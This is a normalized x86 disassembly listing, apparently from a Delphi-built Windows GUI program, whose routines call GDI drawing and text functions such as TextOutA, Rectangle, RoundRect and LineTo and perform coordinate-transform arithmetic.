lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43a0b4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_458bb8
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43763c
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f80
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43b724
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45b264
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403394
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43a088
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43a088
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43a710
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_458d04
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45b2c4
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45aee0
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45aee0
jmp r-xdata
sub_45b704
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f3c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f3c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b740
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43b724
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43b724
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_446e50
sub_45b7d0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45b7f8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45b89c
add [ eax ] eax
add [ eax ] al
in al 0xbc
inc edi
add [ eax + 0x6c ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45b8ff
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b906
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4512c4
mov eax sub_451544
call sub_413b7c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45c43c
push ebx
mov ebx [ eax ]
add ebx [ eax + 0x8 ]
sar ebx 0x1
jns r-xdata
mov [ edx ] ebx
mov edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
sar edx 0x1
jns r-xdata
adc ebx 0x0
mov [ ecx ] edx
pop ebx
retn
adc edx 0x0
sub_45c45c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d17c
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x21 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c4ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d1e8
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x21 ]
mov [ ebx + 0x21 ] dl
mov al [ eax + 0x20 ]
mov [ ebx + 0x20 ] al
sub_45c508
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_45c45c
xor edx edx
mov eax esi
call sub_45c4e0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c554
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_45c45c
mov edx 0x808080
mov eax esi
call sub_41d310
mov dl 0x2
mov eax esi
call sub_41d40c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c5ac
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_45c45c
mov edx 0x808080
mov eax esi
call sub_41d310
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c5fc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_45c45c
mov edx 0x2
mov eax esi
call sub_41d43c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c64c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_45c45c
mov edx 0xffffff
mov eax esi
call sub_41d310
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c69c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x38 ] esi
mov [ edi + 0xc ] 0x1
mov [ edi + 0x20 ] 0x64
mov [ edi + 0x24 ] 0x1
mov [ edi + 0x14 ] 0x159
mov [ edi + 0x4 ] 0x159
mov [ edi + 0x10 ] 0xf
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45c750
push ebx
mov ebx eax
cmp edx [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] edx
mov eax ebx
call sub_45c6fc
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_45c774
push ebx
mov ebx eax
cmp edx [ ebx + 0x1c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_45c6fc
cmp [ ebx + 0x2a ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_45c7a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov [ ebx + 0x20 ] esi
mov eax ebx
call sub_45c6fc
mov edx esi
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_45c7d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov dl [ eax + 0xc ]
mov [ ebx + 0xc ] dl
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x1c ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov al [ eax + 0x24 ]
mov [ ebx + 0x24 ] al
sub_45c84c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0xc ]
xor edx edx
mov eax esi
call sub_41d310
mov edx 0x1
mov eax esi
call sub_41d43c
xor edx edx
mov eax esi
call sub_41d40c
mov esi [ ebx + 0x10 ]
mov edx 0xffffff
mov eax esi
call sub_41d618
xor edx edx
mov eax esi
call sub_41d734
mov esi [ ebx + 0x8 ]
xor edx edx
mov eax esi
call sub_41ce24
mov edx 0xa
mov eax esi
call sub_41d0c4
mov edx 0xffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop esi
pop ebx
retn
sub_45c8bc
push ebx
push esi
add esp 0xfffffff4
mov ebx edx
mov esi eax
cmp [ ebx + 0x21 ] 0x0
je r-xdata
mov dl 0x5
mov eax [ esi + 0xc ]
call sub_41d40c
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov eax ebx
call sub_41d434
dec eax
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_41d308
call sub_41c964
mov [ esp + 0x4 ] eax
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x1
push 0x8
call ExtCreatePen
mov edx eax
mov eax [ esi + 0xc ]
call sub_41d3d0
jmp r-xdata
sub_45c934
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esp
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call GetTextExtentPoint32A
test eax eax
je r-xdata
xor eax eax
mov eax [ esp ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45c97c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esp
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call GetTextExtentPoint32A
test eax eax
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_45c9d3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop esi
pop ebx
retn
sub_45c9f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov [ esi + 0xab ] 0x1
mov [ esi + 0x14 ] 0x0
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x18 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
mov [ esi + 0x91 ] 0x0
mov [ esi + 0x98 ] 0x1
mov [ esi + 0x9a ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_45ca74
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_45ca60
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_45cab4
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
push eax
mov eax [ esi + 0x4 ]
call sub_41dd60
push eax
call SetBkMode
pop esi
pop ebx
retn
sub_45cad0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call SetBkColor
pop esi
pop ebx
retn
sub_45cb04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov esi eax
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
push esi
call SetTextColor
mov eax edi
call sub_4041a8
push eax
mov eax edi
call sub_4043a8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call TextOutA
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45cb5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call Rectangle
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45cb88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call RoundRect
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45cbd4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_45cbf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call LineTo
pop edi
pop esi
pop ebx
retn
sub_45cc14
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x4 ]
call sub_41dd60
push eax
call Rectangle
pop esi
pop ebx
retn
sub_45cc58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov esi [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
lea edx [ ebp - 0x10 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
lea edx [ ebp - 0x18 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
lea edx [ ebp - 0x20 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xc0 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc4 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebx + 0xc8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0xcc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebx + 0xd0 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebx + 0xd4 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebx + 0xd8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0xdc ] eax
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45cd2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_45ceb8
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45cd60
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
call sub_45ceb8
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45cd8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
fld [ r-xdata ]
fdiv [ ebx + 0xb0 ]
fstp [ ebp - 0x10 ]
fwait
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ edi ]
sub eax [ ebx + 0x2c ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
call sub_402990
sub eax [ ebp + 0x8 ]
add eax [ ebx + 0x20 ]
mov [ edi ] eax
mov eax [ esi ]
sub eax [ ebx + 0x30 ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
call sub_402990
add eax [ ebp + 0x8 ]
add eax [ ebx + 0x24 ]
mov [ esi ] eax
jmp r-xdata
fld [ ebx + 0x70 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x60 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x28 ]
sub [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebx + 0x2c ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
fild [ ebp + 0x8 ]
fmul [ ebx + 0x80 ]
fsubp st1
mov eax [ esi ]
sub eax [ ebx + 0x24 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0x58 ]
fsubp st1
fdiv [ ebx + 0x70 ]
call sub_402990
add eax [ ebx + 0x20 ]
mov [ edi ] eax
mov eax [ esi ]
sub eax [ ebx + 0x30 ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
fild [ ebp + 0x8 ]
fmul [ ebx + 0x88 ]
fsubp st1
mov eax [ ebp - 0x4 ]
sub eax [ ebx + 0x20 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0x78 ]
fsubp st1
fdiv [ ebx + 0x60 ]
call sub_402990
add eax [ ebx + 0x24 ]
mov [ esi ] eax
sub_45ceb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ edi ]
sub eax [ ebx + 0x20 ]
add eax esi
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0xb0 ]
call sub_402990
add eax [ ebx + 0x2c ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x24 ]
sub eax esi
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fmul [ ebx + 0xb0 ]
call sub_402990
add eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub esi [ ebx + 0x28 ]
mov eax [ edi ]
sub eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x24 ]
mov [ ebp - 0x14 ] eax
fld [ ebx + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebx + 0xb0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xb4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0x8 ]
fld [ ebx + 0x48 ]
fmulp st1
fild [ ebp - 0x14 ]
fld [ ebx + 0x38 ]
fmulp st1
fsubp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x68 ]
faddp st1
fmul [ ebx + 0xb8 ]
fsubr [ r-xdata ]
fmul [ ebx + 0xb0 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fild [ ebp - 0x8 ]
fmul [ ebx + 0x70 ]
fild [ ebp - 0x14 ]
fmul [ ebx + 0x58 ]
faddp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x80 ]
faddp st1
fmul [ ebp - 0x10 ]
call sub_402990
add eax [ ebx + 0x2c ]
mov [ edi ] eax
fild [ ebp - 0x8 ]
fmul [ ebx + 0x78 ]
fild [ ebp - 0x14 ]
fmul [ ebx + 0x60 ]
faddp st1
mov [ ebp - 0x18 ] esi
fild [ ebp - 0x18 ]
fmul [ ebx + 0x88 ]
faddp st1
fmul [ ebp - 0x10 ]
call sub_402990
add eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
sub_45d004
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push 0x1
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x108 ]
pop esi
pop ebx
pop ebp
retn 0x18
sub_45d034
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
fld [ ebp + 0x8 ]
call sub_402990
lea edx [ eax + edi ]
push edx
mov edx [ ebp - 0x4 ]
add edx eax
push edx
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
sub ecx eax
mov edx edi
sub edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45d07c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45ceb8
cmp [ esi + 0xab ] 0x0
je r-xdata
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor ebx ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
fld [ esi + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x5c ]
test bl bl
je r-xdata
